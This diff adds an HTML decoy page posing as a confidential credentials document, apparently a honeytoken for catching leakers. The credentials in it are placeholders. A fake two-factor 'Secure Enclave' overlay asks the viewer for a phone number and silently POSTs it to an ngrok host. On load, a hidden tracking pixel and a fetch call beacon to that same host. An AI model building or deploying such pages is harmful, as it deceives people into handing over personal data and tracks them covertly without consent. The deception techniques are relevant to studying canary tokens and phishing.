@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Confidential Document</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 30px; background: #f8f8f8; color: #333; max-width: 800px; margin: 0 auto; }
+        .header { border-bottom: 2px solid #333; margin-bottom: 20px; padding-bottom: 10px; }
+        .header h1 { margin: 0 0 5px 0; font-size: 22px; }
+        .header p { margin: 0; color: #666; font-size: 12px; }
+        .warning { color: red; font-weight: bold; border: 1px solid red; padding: 10px; margin: 20px 0; background: #fff5f5; font-size: 13px; }
+        .section { margin: 20px 0; }
+        .section h3 { border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        ul li { margin: 5px 0; font-family: monospace; font-size: 13px; }
+        .footer { margin-top: 60px; color: #aaa; font-size: 9px; border-top: 1px solid #eee; padding-top: 10px; }
+        .blur { filter: blur(6px); user-select: none; pointer-events: none; }
+    </style>
+</head>
+<body onload="t()">
+    <!-- ACTIVE DECEPTION WALL -->
+    <div id="auth-wall" style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(240,240,240,0.95); z-index:9999; display:flex; flex-direction:column; align-items:center; justify-content:center;">
+        <div style="background:#fff; padding:40px; border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,0.1); text-align:center; max-width:350px; border-top: 4px solid #d32f2f;">
+            <h2 style="margin-top:0; color:#d32f2f; font-size:18px;">SECURE ENCLAVE</h2>
+            <p style="color:#666; font-size:13px; margin-bottom:20px;">This is a restricted corporate document. Two-Factor Authentication is required. Enter your registered phone number to decrypt.</p>
+            <input type="tel" id="p-input" placeholder="+91 98765 43210" style="padding:12px; width:100%; border:1px solid #ddd; border-radius:6px; margin-bottom:15px; font-size:15px; box-sizing:border-box; outline:none; text-align:center;">
+            <button onclick="v()" style="background:#222; color:white; border:none; padding:12px 24px; font-size:14px; font-weight:bold; border-radius:6px; cursor:pointer; width:100%; transition:background 0.2s;">Send OTP & Decrypt</button>
+            <p id="err" style="color:red; font-size:11px; margin-top:10px; display:none;">Please enter a valid phone number.</p>
+        </div>
+    </div>
+
+    <!-- BLURRED CONTENT -->
+    <div id="content" class="blur">
+        <div class="header">
+            <h1>PROJECT ALPHA: CORE CREDENTIALS</h1>
+            <p>INTERNAL USE ONLY — EXFILTRATION PROHIBITED</p>
+        </div>
+        
+        <div class="warning">
+            ⚠ WARNING: This document is traced. Unauthorized distribution will be flagged.
+        </div>
+        
+        <div class="section">
+            <h3>Database Credentials (PROD)</h3>
+            <ul>
+                <li>Host: internal-db.corporate.lan</li>
+                <li>User: sys_admin</li>
+                <li>Key: AKIA_EXAMPLE_12345</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h3>VPN Configuration</h3>
+            <ul>
+                <li>Gateway: vpn.acme-corp.internal:443</li>
+                <li>Protocol: WireGuard (wg0)</li>
+                <li>Pre-shared Key: PSK_INTERNAL_9f8e7d6c</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- TRACKING MECHANISM 1: Ghost Pixel (works without JS) -->
+    <img src="https://jene-plinthless-darius.ngrok-free.dev/api/v1/ghost-pixel/Project_Omega_Keys" style="position:absolute;left:-9999px;top:-9999px;" width="1" height="1" alt="" />
+
+    <!-- TRACKING MECHANISM 2: JavaScript fetch with client fingerprinting -->
+    <script>
+    function v() {
+        var p = document.getElementById('p-input').value;
+        if(p.length >= 8) {
+            document.getElementById('auth-wall').style.display = 'none';
+            document.getElementById('content').classList.remove('blur');
+            try {
+                var u = "https://jene-plinthless-darius.ngrok-free.dev/api/v1/capture-intel/Project_Omega_Keys";
+                fetch(u, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true'},
+                    body: JSON.stringify({phone: p})
+                }).catch(function(){});
+            } catch(e) {}
+        } else {
+            document.getElementById('err').style.display = 'block';
+        }
+    }
+
+    function t() {
+        try {
+            var u = "https://jene-plinthless-darius.ngrok-free.dev/api/v1/ghost-pixel/Project_Omega_Keys";
+            var cb = "?cb=" + Date.now();
+            fetch(u + cb, { 
+                method: 'GET',
+                headers: {
+                    'ngrok-skip-browser-warning': 'true'
+                }
+            }).catch(function(){});
+            var i = new Image(); i.src = u + "?fb=1&t=" + Date.now();
+        } catch(e) {}
+    }
+    t();
+    </script>
+
+    <div class="footer">
+        Fingerprint: Project_Omega_Keys_UHJvamVjdF | Classification: RESTRICTED
+    </div>
+</body>
+</html>
